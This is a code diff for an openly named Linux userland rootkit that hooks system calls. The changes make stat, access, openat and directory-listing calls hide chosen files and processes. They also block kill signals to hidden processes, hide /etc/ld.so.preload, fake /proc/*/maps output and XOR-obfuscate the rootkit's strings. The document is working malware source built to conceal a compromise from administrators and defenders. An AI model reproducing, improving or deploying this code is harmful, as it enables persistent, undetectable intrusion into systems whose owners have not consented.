@@ -18,7 +18,8 @@
 #include <sys/syscall.h>
 #include <sys/mman.h>
 
-#define BUF_SIZE 4096
+#define DEBUG
+#define BUF_SIZE 8192
 #include "utils/clean.c"
 #include "utils/xor.c"
 #include "rk.h"
@@ -26,9 +27,10 @@
 #include "utils/is_hidden.c"
 #include "utils/is_rk_user.c"
 #include "utils/pid2pname.c"
-#include "stealth/fake_mmap_min_addr.c"
 #include "stealth/hide_ldd.c"
 #include "stealth/hide_env.c"
+#include "stealth/install_rk.c"
+#include "stealth/hide_maps.c"
 #include "rkconsts.h"
 
 typedef long (*syscall_fn_t)(long, long, long, long, long, long, long);
@@ -112,7 +114,7 @@ static long rk_hook(long a1, long a2, long a3,
             if (is_rk_user()) break;
             DEBUG_MSG("[-] stat hooked!\n");
             const char *path = (const char *)a2;
-            if (check_if_hidden_path(path)) {
+            if (check_if_hidden_str(path)) {
                 DEBUG_MSG("[!] Hiding file %s from stat\n", path);
                 return -ENOENT;
             }
@@ -126,7 +128,7 @@ static long rk_hook(long a1, long a2, long a3,
             char path[256];
             fd = (int)a2;
             fd_to_fname(fd, path, sizeof(path));             
-            if (check_if_hidden_path(path)) {
+            if (check_if_hidden_str(path)) {
                 DEBUG_MSG("[!] Hiding file %s from fstat\n", path);
                 return -ENOENT;
             }
@@ -137,7 +139,7 @@ static long rk_hook(long a1, long a2, long a3,
             if (is_rk_user()) break;
             DEBUG_MSG("[-] lstat hooked!\n");
             char *path = (char *)a2;
-            if (check_if_hidden_path(path)) {
+            if (check_if_hidden_str(path)) {
                 DEBUG_MSG("[!] Hiding file %s from lstat\n", path);
                 return -ENOENT;
             }
@@ -148,7 +150,7 @@ static long rk_hook(long a1, long a2, long a3,
             if (is_rk_user()) break;
             DEBUG_MSG("[-] access hooked!\n");
             char *path = (char *)a2;
-            if (check_if_hidden_path(path)) {
+            if (check_if_hidden_str(path)) {
                 DEBUG_MSG("[!] Hiding file %s from access\n", path);
                 return -ENOENT;
             }
@@ -167,16 +169,16 @@ static long rk_hook(long a1, long a2, long a3,
             // DEBUG_MSG("[-] %s\n", ld_linux_so);
             // DEBUG_MSG("[-] %d\n", fnmatch(filename, ld_linux_so, FNM_NOESCAPE));
             int i = 0;
-            while (argv[i] != NULL) {
-                DEBUG_MSG("argv: %s\n", argv[i]);
-                i++;
-            }
-            i = 0;
-            while (envp[i] != NULL) {
-                DEBUG_MSG("envp: %s\n", envp[i]);
-                i++;
-            }
-            i = 0;
+            // while (argv[i] != NULL) {
+            //     DEBUG_MSG("argv: %s\n", argv[i]);
+            //     i++;
+            // }
+            // i = 0;
+            // while (envp[i] != NULL) {
+            //     DEBUG_MSG("envp: %s\n", envp[i]);
+            //     i++;
+            // }
+            // i = 0;
             
             /* BAD CODE, REVAMP LATER */
             // check if we are calling ldd
@@ -215,13 +217,17 @@ static long rk_hook(long a1, long a2, long a3,
             // convert pid to string
             pid_t pid = (pid_t)a2;
             char pid_str[20];
-            char pid_name[BUF_SIZE];
+            char proc_name[4096];
             sprintf(pid_str, "%d", pid);
-            pid_to_pname(pid_str, pid_name);
-            printf("[?] %s -> %s\n", pid_str, pid_name);
+            pid_to_pname(pid_str, proc_name);
+            if (check_if_hidden_str(pid_str)) {
+                DEBUG_MSG("[!] Intercepting kill syscall to %s\n", proc_name);
+                // oh noo haha u got me
+                return -ENOENT;
+            }            
             break;
-        
         }
+        // i think this is only needed for armbian64, not sure
         case SYS_GETDENTS: {
             // int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
             if (is_rk_user()) break;
@@ -256,14 +262,14 @@ static long rk_hook(long a1, long a2, long a3,
                     if (in_proc == 1) {
                         char proc_name[256];
                         pid_to_pname(d->d_name, proc_name);
-                        if (check_if_hidden_path(proc_name)) {
+                        if (check_if_hidden_str(proc_name)) {
                             DEBUG_MSG("[!] Hiding procs %s from getdents\n", proc_name);
                             bpos += d->d_reclen;
                             continue;
                         }
                     }
                     else {
-                        if (check_if_hidden_path(d->d_name)) {
+                        if (check_if_hidden_str(d->d_name)) {
                             DEBUG_MSG("[!] Hiding file %s from getdents\n", d->d_name);
                             bpos += d->d_reclen;
                             continue; // Skip entry
@@ -304,6 +310,8 @@ static long rk_hook(long a1, long a2, long a3,
                 in_proc = 1;
                 DEBUG_MSG("[?] Inside /proc!\n")
             }
+        
+            char *ld_so_preload = strdup(LD_SO_PRELOAD); xor(ld_so_preload);
             // struct linux_dirent64 {
             //     ino64_t        d_ino;    /* 64-bit inode number */
             //     off64_t        d_off;    /* 64-bit offset to next structure */
@@ -336,17 +344,22 @@ static long rk_hook(long a1, long a2, long a3,
                             pid_to_pname(d->d_name, proc_name);
                             DEBUG_MSG("%s -> %s\n", d->d_name, proc_name);
                         }
-                        if (check_if_hidden_path(proc_name)) {
+                        if (check_if_hidden_str(proc_name)) {
                             DEBUG_MSG("[!] Hiding process %s from getdents64\n", d->d_name);
                             bpos += d->d_reclen;
                             continue;
                         }
                     }
                     else {
-                        if (check_if_hidden_path(d->d_name)) {
+                        if (check_if_hidden_str(d->d_name)) {
                             DEBUG_MSG("[!] Hiding file %s from getdents64\n", d->d_name);
                             bpos += d->d_reclen;
                             continue; // Skip entry
+                        }
+                        else if ((!has_backup_ld_so_preload()) && (!strcmp(d->d_name, ld_so_preload))) {
+                            DEBUG_MSG("[!] Hiding /etc/ld.so.preload\n");
+                            bpos += d->d_reclen;
+                            continue;
                         }
                     }
                     // Calculate the length of the valid entries
@@ -370,8 +383,19 @@ static long rk_hook(long a1, long a2, long a3,
             DEBUG_MSG("[-] openat hooked!\n");
             char *path = (char *)a3;
             DEBUG_MSG("[-] Attempting to open %s\n", path);
-            if (check_if_hidden_path(path)) {
+            if (check_if_hidden_str(path)) {
                 DEBUG_MSG("[!] Hiding file %s\n", path);
+                return -ENOENT;
+            };
+            // probably need to xor this out 
+            if (!fnmatch("/proc/*/maps", path, FNM_PATHNAME)) {
+                DEBUG_MSG("[!] Hiding from /proc/*/maps\n");
+                return fileno(hide_maps(path));
+            }
+            char *ld = strdup(LD_SO_PRELOAD_PATH); xor(ld);
+            if (!strcmp(path, ld)) {
+               // TODO: Return backup if /etc/ld.so.preload already existed 
+               // prior to installing rootkit 
                 return -ENOENT;
             }
         }
